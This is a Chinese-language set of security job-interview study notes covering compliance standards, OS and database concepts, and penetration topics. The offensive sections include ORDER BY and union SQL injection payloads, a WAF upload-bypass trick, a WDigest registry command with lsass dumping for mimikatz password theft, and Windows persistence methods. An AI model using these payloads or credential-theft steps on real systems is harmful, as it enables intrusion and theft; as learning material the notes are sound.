vim删除行

12、擅长与不擅长
8.13 绿盟 安全咨询顾问 8.17二面 8.19三面
评估：等保，风险评估，数据合规评估，车联网，关机评估。

体系建设：管理：制度编写。技术。生命周期管理，权限管理，申请账户，账户清理。

规划：安全目标规划。

技术能力；文档能力；法律法规标准。

四大咨询。

1、法律法规
2、反序列化？代码审计？函数实现？
3、攻防原理了解吗？
4、文件上传防御
5、Android和ios安全
6、应急和样本分析
7、ring0 ring3级别
8、windows自启动方式
修改注册表的方式

设置脚本启动的方式

添加任务计划的方式

dll加载顺序

一种是加载时动态链接(Load_time dynamic linking)。Windows搜索要装入的DLL时，按以下顺序：应用程序所在目录→当前目录→Windows SYSTEM目录→Windows目录→PATH环境变量指定的路径。

《网络安全等级保护基本要求》等保2.0--2017
安全通用要求细分为技术要求和管理要求。其中技术要求包括“安全物理环境”、“安全通信网络”、“安全区域边界”、“安全计算环境”和“安全管理中心”；管理要求包括“安全管理制度”、“安全管理机构”、“安全管理人员”、“安全建设管理”和“安全运维管理”。

1 安全物理环境

针对物理机房提出的安全控制要求。主要对象为物理环境、物理设备和物理设施等；涉及的安全控制点包括物理位置的选择、物理访问控制、防***和防破坏、防雷击、防火、防水和防潮、防静电、温湿度控制、电力供应和电磁防护。

2 安全通信网络

针对通信网络提出的安全控制要求。主要对象为广域网、城域网和局域网等；涉及的安全控制点包括网络架构、通信传输和可信验证。

3 安全区域边界

针对网络边界提出的安全控制要求。主要对象为系统边界和区域边界等；涉及的安全控制点包括边界防护、访问控制、入侵防范、恶意代码防范、安全审计和可信验证。

4 安全计算环境

针对边界内部提出的安全控制要求。主要对象为边界内部的所有对象，包括网络设备、安全设备、服务器设备、终端设备、应用系统、数据对象和其他设备等；涉及的安全控制点包括身份鉴别、访问控制、安全审计、入侵防范、恶意代码防范、可信验证、数据完整性、数据保密性、数据备份与恢复、剩余信息保护和个人信息保护。

5 安全管理中心

针对整个系统提出的安全管理方面的技术控制要求，通过技术手段实现集中管理；涉及的安全控制点包括系统管理、审计管理、安全管理和集中管控。

6 安全管理制度

针对整个管理制度体系提出的安全控制要求，涉及的安全控制点包括安全策略、管理制度、制定和发布以及评审和修订。

7 安全管理机构

针对整个管理组织架构提出的安全控制要求，涉及的安全控制点包括岗位设置、人员配备、授权和审批、沟通和合作以及审核和检查。

8 安全管理人员

针对人员管理提出的安全控制要求，涉及的安全控制点包括人员录用、人员离岗、安全意识教育和培训以及外部人员访问管理。

9 安全建设管理

针对安全建设过程提出的安全控制要求，涉及的安全控制点包括定级和备案、安全方案设计、安全产品采购和使用、自行软件开发、外包软件开发、工程实施、测试验收、系统交付、等级测评和服务供应商管理。

10 安全运维管理

针对安全运维过程提出的安全控制要求，涉及的安全控制点包括环境管理、资产管理、介质管理、设备维护管理、漏洞和风险管理、网络和系统安全管理、恶意代码防范管理、配置管理、密码管理、变更管理、备份与恢复管理、安全事件处置、应急预案管理和外包运维管理。

No.3 安全扩展要求

安全扩展要求是采用特定技术或特定应用场景下的等级保护对象需要增加实现的安全要求。包括以下四方面：

1.云计算安全扩展要求是针对云计算平台提出的安全通用要求之外额外需要实现的安全要求。主要内容包括“基础设施的位置”、“虚拟化安全保护”、“镜像和快照保护”、“云计算环境管理”和“云服务商选择”等。

2.移动互联安全扩展要求是针对移动终端、移动应用和无线网络提出的安全要求，与安全通用要求一起构成针对采用移动互联技术的等级保护对象的完整安全要求。主要内容包括“无线接入点的物理位置”、“移动终端管控”、“移动应用管控”、“移动应用软件采购”和“移动应用软件开发”等。

3.物联网安全扩展要求是针对感知层提出的特殊安全要求，与安全通用要求一起构成针对物联网的完整安全要求。主要内容包括“感知节点的物理防护”、“感知节点设备安全”、“网关节点设备安全”、“感知节点的管理”和“数据融合处理”等。

4.工业控制系统安全扩展要求主要是针对现场控制层和现场设备层提出的特殊安全要求，它们与安全通用要求一起构成针对工业控制系统的完整安全要求。主要内容包括“室外控制设备防护”、“工业控制系统网络架构安全”、“拨号使用控制”、“无线使用控制”和“控制设备安全”等。

二面
1、如何针对一个站做渗透
从信息收集--到内网。

2、如何实现横向移动和留后门
3、了解哪些安全标准
4、如何解决问题？
1、深入理解问题的本质

2、寻找解决方案：书本，老师，网络，github等

3、执行解决方案，总结问题。

5、什么推动了网络安全的发展
信息技术变革，黑客攻防技术，合规。

6、如何解决矛盾
1、生活矛盾。

2、工作矛盾。

7、优劣势
优势：1、沟通。2、web和内网渗透技术；3、自学和坚持 4、有一定的抗压能力。

劣势：

1、安全知识体系不完善，实战经验不够，没打过护网，但也在积极挖洞，有时参与ctf。

2、性格较软温和，不够强势，主要体现在不会对别人提太多要求。如果是领导管理层的话就会显露出一定的劣势，彰显不出威信。但我也在积极弥补，本科积极担任团支书，学生社团副主席，其他实践活动的负责人等。

三面
咨询与渗透的关系？咨询行业职业规划

8.12虎牙 蓝军 攻防对抗 8.21二面 8.31终面
渗透

1、挖到的漏洞？
锐捷网关getshell。4430端口，查询用户是否上线，没有对userip过滤，导致命令执行，echo shell到文件。

redis未授权访问。可以说。

2、复现的漏洞有哪些深刻的？
shiro反序列化。文件上传。

Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认AES密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。其Cookie的Key的值为RememberMe，Value的值是经过序列化、AES加密和Base64编码后得到的结果。

CMSPHP9.6.0任意文件上传漏洞

其根本问题在于注册时可通过变量控制改变程序逻辑，使其加载一个远程的文件到本地，而又因为程序对远程URL处理不当导致后缀名可控，于是就可上传shell。上传路径就是uploadfile/年月日时间具体到秒+3位100-999的随机数+文件后缀年月日时分秒再加三位数字，遍历一下即可。函数的大概功能是把对应url的文件下载下来，并且保存到本地。这是一个危险的操作，如果下载的是可执行文件的话，就可以get shell。modelid可控，可以看到$status大于0时，将$userid加入$user_model_info数组中再进行数据库的插入操作，插入数据库v9_member_detail表，但是此表没有content字段，所以会报错，爆出路径。

SQL Server 的存储过程。sa账户。

3、端口扫描：6379？8009？
Tomcat服务器通过Connector连接器组件与客户程序建立连接，Connector组件负责接收客户的请求，以及把Tomcat服务器的响应结果发送给客户。默认情况下，Tomcat在server.xml中配置了两种连接器：

第一个连接器监听8080端口，负责建立HTTP连接。在通过浏览器访问Tomcat服务器的Web应用时，使用的就是这个连接器。 第二个连接器监听8009端口，负责和其他的HTTP服务器建立连接。在把Tomcat与其他HTTP服务器集成时，就需要用到这个连接器。

ajp协议的8009端口： ajp13是一个二进制的TCP传输协议，相比HTTP这种纯文本的协议来说，效率和性能更高，也做了很多优化。显然，浏览器并不能直接支持AJP13协议，只支持HTTP协议。8009--httpd等反向代理tomcat时就可以使用使用ajp协议反向代理到该端口。虽然我们经常都是使用http反向代理到8080端口，但由于ajp建立tcp连接后一般长时间保持，从而减少了http反复进行tcp连接和断开的开销，所以反向代理中ajp是比http高效的。

4、如何利用redis
公私钥，网站目录，即使任务计划。自启动目录，主从复制。

5、文件上传如何绕过过滤？
6、nginx解析漏洞？
url后加php将图片解析为php。

7、SQL注入防御？
变量类型限制，输入过滤，预编译。控制权限，改变端口，不会显错误信息。

8、预编译可以防御所有SQL注入吗？
但是不是所有场景都能够采用 sql语句预编译，有一些场景必须的采用 字符串拼接的方式，此时，我们严格检查参数的数据类型，还有可以使用一些安全函数，来方式sql注入。

比如 String sql = "select id,no from user where id=" + id;

在接收到用户输入的参数时，我们就严格检查 id，只能是int型。复杂情况可以使用正则表达式来判断。

#{}是占位符，预编译处理；${}是拼接符，字符串替换，没有预编译处理。

9、免杀
3.1 杀软常见扫描方式

1、扫描压缩包技术：即是对压缩包案和封装文件作分析检查的技术。
2、程序窜改防护：即是避免恶意程序借由删除杀毒侦测程序而大肆破坏电脑。
3、修复技术：即是对恶意程序所损坏的文件进行还原
4、急救盘杀毒：利用空白U盘制作急救启动盘，来检测电脑病毒。
5、智能扫描：扫描最常用的磁盘，系统关键位置，耗时较短。
6、全盘扫描：扫描电脑全部磁盘，耗时较长。
7、勒索软件防护：保护电脑中的文件不被黑客恶意加密。
8、开机扫描：当电脑开机时自动进行扫描，可以扫描压缩文档和可能不需要的程序
3.2 监控技术

1、内存监控：当发现内存中存在病毒的时候，就会主动报警；监控所有进程；监控读取到内存中的文件；监控读取到内存的网络数据。
2、文件监控：当发现写到磁盘上的文件中存在病毒，或者是被病毒感染，就会主动报警。
3、邮件监控：当发现电子邮件的附件存在病毒时进行拦截。
4、网页防护：阻止网络攻击和不安全下载。
5、行为防护：提醒用户可疑的应用程序行为。
waf们的检测机制是怎么样的
文件名后缀 解析文件名，判断是否在黑名单内
文件内容 解析文件内容，判断是否为WEBSHELL
文件目录权限 该功能需要主机WAF实现，比如安全狗、云锁。
扰乱WAF的判断点，且不能影响到目标服务器正常解析，如写两个filename，第一个filename=1.jpg，第二个filename=1.php，此时WAF只会取了第一个filename进行判断，而目标服务器取文件名是取的第二个存于服务器磁盘，原因在于以下数据包中有5条分割线，第二条与其他不一致导致被WEB容器忽略（当然不是所有的中间件都会这样）

10、mimikatz的windows版本,高版本如何使用？
在系统为win10或2012R2以上时,都需要配置注册表并重新登录后才能抓取明文。可以通过修改注册表来让Wdigest Auth保存明文口令，当系统为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，密码字段显示为null，此时可以通过修改注册表的方式抓取明文，但需要用户重新登录后才能成功抓取。

reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
原理：获取到内存文件lsass.exe进程(它用于本地安全和登陆策略)中存储的明文登录密码

利用前提：拿到了admin权限的cmd，管理员用密码登录机器，并运行了lsass.exe进程，把密码保存在内存文件lsass进程中。当mimikatz无法在主机上运行时，可以使用微软官方发布的工具Procdump导出lsass.exe:

抓取明文：手工修改注册表 + 强制锁屏 + 等待目标系统管理员重新登录 = 截取明文密码

优点：用procdump导出lsass.dmp后拖回本地抓取密码来规避杀软。

缺点：修改注册表之后,需要重新登录才能生效,可以使用锁屏脚本(锁屏之前，一定要查看管理员是否在线)，让管理员重新登录。

11、windows不安全的三个方面
免杀，认证hash获得与伪造，SMB，NTLM等协议，

Linux 系统的安全性与 Windows 系统的安全性相比较是否有优势 ? 如果有，为什么会有这种优势 ?

答:一般认为，Linux系统与Windows系统相比，安全方面具有优势，造成这种优势的主要原因有以下几个方面:

(1) Linux的开源软件开发方式更容易暴露错误，这是Windows不具备的优势。

(2) Windows的许多应用程序依靠远程程序调用， 而Linux则限制使用远程程序调用。

(3) 某些第三方Windows应用软件中经常需要管理员的权限才能正确运行软件。 因此，这些软件发起的病毒攻击的破坏性极大。而Linux应用软件通常都要遵守这个安全要求，因此，很少被攻击者利用。

(4) Windows具有易学易用性，同时需要兼容不安全的老版本的软件。这些对于系统安全也是一个不利的因素，这个缺点是Linux所没有的。

12、实习技术上的提示
13、就技术栈遇到一些什么问题，如何解决
14、SCI论文什么等级
15、职业规划
反问

8.11海康威视 杭州 8.20人力面
软件多样化

主要是简历上的询问。

1、模糊测试
模糊测试是一种自动或半自动的测试技术，常被用来发现软件/操作系统/网络的代码中的错误和安全性问题，其中用于输入随机的数据和不合法的数据被称为“FUZZ”。之后，系统将被监视各种异常，如系统崩溃或内置代码失败等。并监视程序异常，如崩溃，断言(assertion)失败，以发现可能的程序错误，比如内存泄漏，缓冲区溢出。

半自动模糊测试工具burpsuite

bed只能对协议的标准请求、标准头部进行模糊测试，对http的post等自定义的主体的各项是没法进行模糊测的，但其实这部份才是我们要测试的主要部分，所以单依靠bed是不行的。burpsuite的intruder就是一个高度可配置的模糊测试功能，intruder只要设置好变量然后在payloads中设置好测试用例，即可进行模糊测试。

2、未来发展方向
8.11 网易互娱 安全工程师
1、进程状态有哪些
创建状态：进程在创建时需要申请一个空白PCB，向其中填写控制和管理进程的信息，完成资源分配。如果创建工作无法完成，比如资源无法满足，就无法被调度运行，把此时进程所处状态称为创建状态

就绪状态：进程已经准备好，已分配到所需资源，只要分配到CPU就能够立即运行

执行状态：进程处于就绪状态被调度后，进程进入执行状态

阻塞状态：正在执行的进程由于某些事件（I/O请求，申请缓存区失败）而暂时无法运行，进程受到阻塞。在满足请求时进入就绪状态等待系统调用

终止状态：进程结束，或出现错误，或被系统终止，进入终止状态。无法再执行

如果进程运行时间片使用完也会进入就绪状态。 另外为用户观察需要，进程还有挂起和激活两种操作。挂起后进程处于静止状态进程不再被系统调用，对于操作是激活操作。

2、杀死一个进程会做什么
比较常用的就是强制终止信号：9和终止信号：15，另外，中断信号：2其实就是我们前文提到的Ctrl + C结束前台进程。因为kill -15信号只是通知对应的进程要进行"安全、干净的退出"，程序接到信号之后，退出前一般会进行一些"准备工作"，如资源释放、临时文件清理等等，如果准备工作做完了，再进行程序的终止。

相比于kill -15命令，kill -9在执行时，应用程序是没有时间进行"准备工作"的，所以这通常会带来一些副作用，数据丢失或者终端无法恢复到正常状态等。

图片

当进程完成执行最后语句并且通过系统调用 exit() 请求操作系统删除自身时，进程终止。这时，进程可以返回状态值（通常为整数）到父进程（通过系统调用 wait()）。所有进程资源，如物理和虚拟内存、打开文件和 I/O 缓冲区等，会由操作系统释放。

3、僵尸进程
这些完成了生命周期但却依然留在进程表中的进程，我们称之为 “僵尸进程”。当你运行一个程序时，它会产生一个父进程以及很多子进程。 所有这些子进程都会消耗内核分配给它们的内存和 CPU 资源。这些子进程完成执行后会发送一个 Exit 信号然后死掉。这个 Exit 信号需要被父进程所读取。父进程需要随后调用 wait 命令来读取子进程的退出状态，并将子进程从进程表中移除。若父进程正确第读取了子进程的 Exit 信号，则子进程会从进程表中删掉。但若父进程未能读取到子进程的 Exit 信号，则这个子进程虽然完成执行处于死亡的状态，但也不会从进程表中删掉。

打开终端并输入下面命令:ps aux | grep Z找出僵尸进程。

正常情况下我们可以用 SIGKILL信号来杀死进程，但是僵尸进程已经死了， 你不能杀死已经死掉的东西。 因此你需要输入的命令应该是 kill -s SIGCHLD pid，将这里的 pid 替换成父进程的进程 id，这样父进程就会删除所有以及完成并死掉的子进程了。

父进程可以通过系统调用 wait()，等待子进程的终止。系统调用 wait() 可以通过参数，让父进程获得子进程的退出状态；这个系统调用也返回终止子进程的标识符，这样父进程能够知道哪个子进程已经终止了：

pid_t pid; int status; pid = wait(festatus);
当一个进程终止时，操作系统会释放其资源。不过，它位于进程表中的条目还是在的，直到它的父进程调用 wait()；这是因为进程表包含了进程的退出状态。当进程已经终止，但是其父进程尚未调用 wait()，这样的进程称为僵尸进程。

所有进程终止时都会过渡到这种状态，但是一般而言僵尸只是短暂存在。一旦父进程调用了 wait()，僵尸进程的进程标识符和它在进程表中的条目就会释放。

如果父进程没有调用 wait() 就终止，以致于子进程成为孤儿进程，那么这会发生什么？Linux 和 UNIX 对这种情况的处理是：将 init 进程作为孤儿进程的父进程。进程 init 定期调用 wait()，以便收集任何孤儿进程的退出状态，并释放孤儿进程标识符和进程表条目。

4、数据库范式
关系数据库中的关系满足一定要求的，满足不同程度要求的为不同的范式。满足最低要求的叫第一范式，简称1NF；在第一范式的基础上满足进一步要求的称为第二范式，简称2NF，其余范式以此类推。对于各种范式之间有如下关系：图片

图片

第一范式 1NF

定义： 属于第一范式关系的所有属性都不可再分，即数据项不可分。

第二范式 2NF

定义： 若某关系R属于第一范式，且每一个非主属性完全函数依赖于任何一个候选码，则关系R属于第二范式。

此处我们需要理解非主属性、候选码和完全函数依赖的概念。

候选码： 若关系中的某一属性组的值能唯一地标识一个元组，而其子集不能，则称该属性组为候选码。若一个关系中有多个候选码，则选定其中一个为主码。学号和姓名都可以唯一标识一个元组，故该表的候选码为学号和姓名，主码我们可以随便选定其中一个，则选学号为主码。

主属性： 所有候选码的属性称为主属性。不包含在任何候选码中的属性称为非主属性或非码属性。学号和姓名就是该关系的主属性，年龄和性别就是非主属性。

理解： 第二范式是指每个表必须有一个（有且仅有一个）数据项作为关键字或主键（primary key），其他数据项与关键字或者主键一一对应，即其他数据项完全依赖于关键字或主键。由此可知单主属性的关系均属于第二范式。

第三范式 3NF

定义： 非主属性既不传递依赖于码，也不部分依赖于码。理解： 第三范式要求在满足第二范式的基础上，任何非主属性不依赖于其他非主属性，即在第二范式的基础上，消除了传递依赖。

BC范式 BCFN

定义： 关系模式R<U,F>中，若每一个决定因素都包含码，则R<U,F>属于BCFN。

理解： 根据定义我们可以得到结论，一个满足BC范式的关系模式有：

所有非主属性对每一个码都是完全函数依赖；所有主属性对每一个不包含它的码也是完全函数依赖；没有任何属性完全函数依赖于非码的任何一组属性。例如有关系模式C(Cno, Cname, Pcno)，Cno, Cname, Pcno依次表示课程号、课程名、先修课。可知关系C只有一个码Cno，且没有任何属性对Cno部分函数依赖或传递函数依赖，所以关系C属于第三范式，同时Cno是C中的唯一决定因素，所以C也属于BC范式。

第四范式 4NF

定义： 限制关系模式的属性之间不允许有非平凡且非函数依赖的多值依赖。

理解： 显然一个关系模式是4NF，则必为BCNF。也就是说，当一个表中的非主属性互相独立时（3NF），这些非主属性不应该有多值，若有多值就违反了4NF。

第五范式 5NF

第五范式有以下要求： （1）必须满足第四范式； （2）表必须可以分解为较小的表，除非那些表在逻辑上拥有与原始表相同的主键。

第五范式是在第四范式的基础上做的进一步规范化。第四范式处理的是相互独立的多值情况，而第五范式则处理相互依赖的多值情况。

5、数据库连接方式
连接数据库中的表进行查询、建立视图，可以大大提高去查询数据库数据的效率。连接表进行查询实际上是通过各个表之间共同列的关系来查询数据的，他是关系数据查询最重要的特性。

数据库中的多表的连接分以下几种：

1.外连接

1.1.左连接

1.1.1关键字：left join或者left outer join

1.1.2结果集描述：结果集中包括了left join子句中左表的所有行，如果左表中的某行在右表中没有匹配，那么对应的右表的行为空值null 1.2.右连接

1.2.1关键字：right join或者right outer join

1.2.2结果集描述：结果集中包括了right join子句中右表的所有行，如果右表中的某行在左表中没有匹配，那么对应的左表的行为空值null

1.3.完整外部连接
1.3.1关键字：full join或者full outer join
1.3.2结果集描述：结果集中包括了两个表的所有行，如果一个表中的某行在另一个表中没有匹配，那么对应的表的行为空值null。
2.内连接

2.1关键字：join或者inner join
2.2结果集描述：结果集中不包含两个表之间没有匹配的行，通俗点说，将那些带有null值的行去掉。
3.交叉连接

3.1关键字：cross join
3.2结果集描述：结果集中包含了第一个表的行数乘以第二个表的行数等于笛卡尔积结果集的大小。通俗点说就是第一个表中的每一行与另一个表中的每一行按照从上到下的顺序依次的连接。
7、order by 注入
order by是mysql中对查询数据进行排序的方法， 使用示例

select * from 表名 order by 列名(或者数字) asc；升序(默认升序)
select * from 表名 order by 列名(或者数字) desc；降序
这里的重点在于order by后既可以填列名或者是一个数字。举个例子： id是user表的第一列的列名，那么如果想根据id来排序，有两种写法:

select * from user order by id;
selecr * from user order by 1;
当desc此处位置参数可控时，即有可能存在oreder by注入。

order by union盲注
结合union来盲注

username=admin' union 1,2,binary '字符串' order by 3
这里就会对第三列进行比较，即将字符串和密码进行比较。然后就可以根据页面返回的不同情况进行盲注。 注意的是最好加上binary，因为order by比较的时候不区分大小写。

这里的order by 3是根据第三列进行排序，如果我们union查询的字符串比password小的话，我们构造的 1,2,a就会成为第一列，那么在源码对用户名做对比的时候，就会返回username error!，如果union查询的字符串比password大，那么正确的数据就会是第一列，那么页面就会返回password error!.

基于if()盲注
需要知道列名
order by的列不同，返回的页面当然也是不同的，所以就可以根据排序的列不同来盲注。

示例：

order by if(1=1,id,username);
这里如果使用数字代替列名是不行的，因为if语句返回的是字符类型，不是整型。

不需要知道列名
payload

order by if(表达式,1,(select id from information_schema.tables))
如果表达式为false时，sql语句会报ERROR 1242 (21000): Subquery returns more than 1 row的错误，导致查询内容为空，如果表达式为true是，则会返回正常的页面。

基于时间的盲注
payload

order by if(1=1,1,sleep(1))
测试结果

select * from ha order by if(1=1,1,sleep(1)); #正常时间 select * from ha order by if(1=2,1,sleep(1)); #有延迟
测试的时候发现延迟的时间并不是sleep(1)中的1秒，而是大于1秒。 最后发现延迟的时间和所查询的数据的条数是成倍数关系的。

基于rang()的盲注
原理不赘述了，直接看测试结果

mysql> select * from ha order by rand(true); +----+------+ | id | name | +----+------+ |  9 | NULL | |  6 | NULL | |  5 | NULL | |  1 | dss  | |  0 | dasd | +----+------+ mysql> select * from ha order by rand(false); +----+------+ | id | name | +----+------+ |  1 | dss  | |  6 | NULL | |  0 | dasd | |  5 | NULL | |  9 | NULL | +----+------+
可以看到当rang()为true和false时，排序结果是不同的，所以就可以使用rang()函数进行盲注了。 例

order by rand(ascii(mid((select database()),1,1))>96)
order by 报错注入
在网上还看到了order by后的报错注入。 原文链接

updatexml
select * from ha order by updatexml(1,if(1=1,1,user()),1);#查询正常
select * from ha order by updatexml(1,if(1=2,1,user()),1);#查询报错
extractvalue
select * from ha order by extractvalue(1,if(1=1,1,user()));#查询正常
select * from ha order by extractvalue(1,if(1=2,1,user()));#查询报错
8、一个网站如何验证存在SQL注入，且如何注入
错误提示和盲注。

最为经典的单引号判断法： 在参数后面加上单引号,比如:

http://xxx/abc.php?id=1'
如果页面返回错误，则存在 Sql 注入。 原因是无论字符型还是整型都会因为单引号个数不匹配而报错。

and 1=1
and 1=2
and '1'='1
and '1'='2
SQLmap扫描。

注入方法：联合注入、布尔注入、报错注入、时间注入、堆叠注入、二次注入、宽字节注入、cookie注入等等等。

9、SQL注入元数据存储的是
imformation_schema

information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。

爆库语句：

https://xxx.php?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata
涉及schemata表

爆表语句：

爆表语句：

https://xxx.php?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='db_name'
涉及tables表

爆字段语句：

爆字段语句：

https://xxx.php?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='tab_name'
涉及columns表

10、时间盲注
11、SQL防御
过滤，转义，预编译，严控数据变量类型，严格区分用户权限，利用专业的漏洞扫描工具，利用陷阱账户。

没有（运行时）编译，就没有注入。避免数据变成代码被执行，时刻分清代码和数据的界限。

从mysql本身的配置出发：应该保证生产环境的Webserver是关闭错误信息的，比如PHP在生产环境的配置文件php.ini中的display_errors应该设置为Off，这样就关闭了错误提示。

加密数据存储。

第一：设置root密码的时候，采用MD5加密

第二：更改端口3306

第三：关闭远程端口，可以采用***或者安全策略，可以防止注入***

第四：更改root用户名

第五：删除测试数据库，所有的root密码为空，非root的用户

第六：mysql目录权限

第七：mysql服务权限

第八：数据备份设计

12、域协议如何实现
LDPA？

802.1X认证协议？

NTLM?

Kerboros?

13、XSS的分类以及防御
csp防御策略：站通过发送一个 CSP 头部，来告诉浏览器什么是被授权执行的与什么是需要被禁止。CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。

内容安全策略 (CSP) 是一个额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本 (XSS (en-US)) 和数据注入攻击等。无论是数据盗取、网站内容污染还是散发恶意软件，这些攻击都是主要的手段。为使CSP可用, 你需要配置你的网络服务器返回 Content-Security-Policy HTTP头部.

恶意脚本在受害者的浏览器中得以运行，因为浏览器信任其内容来源。CSP通过指定有效域——即浏览器认可的可执行脚本的有效来源——使服务器管理者有能力减少或消除XSS攻击所依赖的载体。一个CSP兼容的浏览器将会仅执行从白名单域获取到的脚本文件，忽略所有的其他脚本 (包括内联脚本和HTML的事件处理属性)。

作为一种终极防护形式，始终不允许执行脚本的站点可以选择全面禁止脚本执行。

14、mimikatz如何拿到，从哪拿到密码，最新爆出的sam数据库漏洞了解吗？
本地管理员权限，具有调试权限，读取内存，lsass，sam。

CVE-2021-36934 漏洞详情
微软上周三发布了一个影响Windows 10操作系统的提权漏洞的解决方法，以防止攻击者访问SAM数据并在受感染的系统上创建新帐户。

这个被称为 Serious SAM 的漏洞会影响所有版本的 Windows 10中的安全帐户管理器 (SAM) 数据库。Windows 中的SAM组件包含用户帐户凭据和网络域信息——这是攻击者的一个重要目标。滥用该漏洞的先决条件是攻击者需要远程或本地访问易受攻击的 Windows 10系统。

微软表示，该漏洞的存在是因为多个系统文件（包括（SAM）数据库）上的访问控制列表过于宽松。“成功利用此漏洞的攻击者可以使用 SYSTEM 权限运行任意代码。然后攻击者可以安装程序；查看、更改或删除数据；或创建具有完全用户权限的新帐户”简单地说，攻击者可以利用该漏洞访问散列凭据的SAM数据库，然后可以脱机解密并用于绕过 Windows 10用户访问控制。

SAM 数据库内容虽然无法在操作系统上访问，但可以在 Windows影卷复制 (VSS) 备份的一部分时访问。影卷复制VSS是一项服务，允许自动或手动实时备份与特定驱动器号（卷）相关的系统文件（保留在当前状态）。

建议系统管理员删除影卷文件的备份副本，微软将两步过程解释为：“如果系统还原点或者影卷没有限制访问 %windir%\system32\config，那么删除它们并在限制访问此目录后创建新的系统还原点。”不过，微软警告说，删除影卷副本“可能会影响还原操作，包括使用第三方备份应用程序还原数据的能力。”

15、SQL Server如何执行命令，什么权限
存储过程，sa账户。

沙盒提权

16、open***协议与传统的区别
***技术通过密钥交换、封装、认证、加密手段在公共网络上建立起私密的隧道，保障传输数据的完整性、私密性和有效性。Open***是近年来新出现的开放源码项目，实现了SSL ***的一种解决方案。 传统SSL ***通过端口代理的方法实现，代理服务器根据应用协议的类型（如http，telnet等）做相应的端口代理，客户端与代理服务器之间建立SSL安全连接，客户端与应用服务器之间的所有数据传输通过代理服务器转发。这种实现方式烦琐，应用范围也比较窄：仅适用于用TCP固定端口进行通信的应用系统，且对每个需要代理的端口进行单独配置；对于每个需要用到动态端口的协议都必须重新开发，且在代理中解析应用协议才能实现代理，如FTP协议；不能对TCP以外的其它网络通信协议进行代理；代理服务器前端的***也要根据代理端口的配置变化进行相应调整。

TUN
在Linux2.4版本以上，操作系统支持一个名为tun的设备，tun设备的驱动程序中包含两个部分，一部分是字符设备驱动，一部分是网卡驱动。网卡的驱动把从TCP/IP协议栈收到的数据包结构skb放于tun设备的读取队列，用户进程通过调用字符设备接口read获得完整的IP数据包，字符驱动read函数的功能是从设备的读取队列读取数据，将核心态的skb传递给用户；反过来字符驱动write函数给用户提供了把用户态的数据写入核心态的接口，write函数把用户数据写入核心空间并穿入TCP/IP协议栈。该设备既能以字符设备的方式被读写，作为系统的虚拟网卡，也具有和物理网卡相同的特点：能够配置IP地址和路由。对虚拟网卡的使用是Open***实现其SSL ***功能的关键。

TAP
Open***提供tun和tap两种工作模式。在tun模式下，从虚拟网卡上收到的是不含物理帧头IP数据包，SSL处理模块对IP包进行SSL封装；在tap模式下，从虚拟网卡上收到的是包含物理帧头的数据包，SSL处理模块对整个物理帧进行SSL封装。Tap模式称为网桥模式，整个虚拟的网络就像网桥方式连接的物理网络。这种模式可以传输以太网帧、IPX、NETBIOS等数据包，应用范围更广。

17、open***工作的流程，如何认证
证书认证。

18、爬虫遇到的一些问题
19、ptrace如何暂停执行
ptrace系统调从名字上看是用于进程跟踪的，它提供了父进程可以观察和控制其子进程执行的能力，并允许父进程检查和替换子进程的内核镜像(包括寄存器)的值。其基本原理是: 当使用了ptrace跟踪后，所有发送给被跟踪的子进程的信号(除了SIGKILL)，都会被转发给父进程，而子进程则会被阻塞，这时子进程的状态就会被系统标注为TASK_TRACED。而父进程收到信号后，就可以对停止下来的子进程进行检查和修改，然后让子进程继续运行。

long ptrace(enum __ptrace_request request,
             pid_t pid,
             void *addr,
             void *data);
Ptrace 提供了一种父进程可以控制子进程运行，并可以检查和改变它的核心image。它主要用于实现断点调试。一个被跟踪的进程运行中，直到发生一个信号。则进程被中止，并且通知其父进程。在进程中止的状态下，进程的内存空间可以被读写。父进程还可以使子进程继续执行，并选择是否是否忽略引起中止的信号。

Ptrace 提供了一种父进程可以控制子进程运行，并可以检查和改变它的核心image。它主要用于实现断点调试。一个被跟踪的进程运行中，直到发生一个信号。则进程被中止，并且通知其父进程。在进程中止的状态下，进程的内存空间可以被读写。父进程还可以使子进程继续执行，并选择是否是否忽略引起中止的信号。

.参数request：请求ptrace执行的操作

.参数pid：目标进程的ID

.参数addr：目标进程的地址值

.参数data：作用则根据request的不同而变化，如果需要向目标进程中写入数据，data存放的是需要写入的数据；如果从目标进程中读数据，data将存放返回的数据

15、mmap
mmap是一种内存映射文件的方法，即将一个文件或者其它对象映射到进程的地址空间，实现文件磁盘地址和进程虚拟地址空间中一段虚拟地址的一一对映关系。实现这样的映射关系后，进程就可以采用指针的方式读写操作这一段内存，而系统会自动回写脏页面到对应的文件磁盘上，即完成了对文件的操作而不必再调用read,write等系统调用函数。内核空间对这段区域的修改也直接反映用户空间，从而可以实现不同进程间的文件共享。

常规文件系统操作（调用read/fread等类函数）中，函数的调用过程：

1、进程发起读文件请求。

2、内核通过查找进程文件符表，定位到内核已打开文件集上的文件信息，从而找到此文件的inode。

3、inode在address_space上查找要请求的文件页是否已经缓存在页缓存中。如果存在，则直接返回这片文件页的内容。

4、如果不存在，则通过inode定位到文件磁盘地址，将数据从磁盘复制到页缓存。之后再次发起读页面过程，进而将页缓存中的数据发给用户进程。

总结来说，常规文件操作为了提高读写效率和保护磁盘，使用了页缓存机制。这样造成读文件时需要先将文件页从磁盘拷贝到页缓存中，由于页缓存处在内核空间，不能被用户进程直接寻址，所以还需要将页缓存中数据页再次拷贝到内存对应的用户空间中。这样，通过了两次数据拷贝过程，才能完成进程对文件内容的获取任务。写操作也是一样，待写入的buffer在内核空间不能直接访问，必须要先拷贝至内核空间对应的主存，再写回磁盘中（延迟写回），也是需要两次数据拷贝。

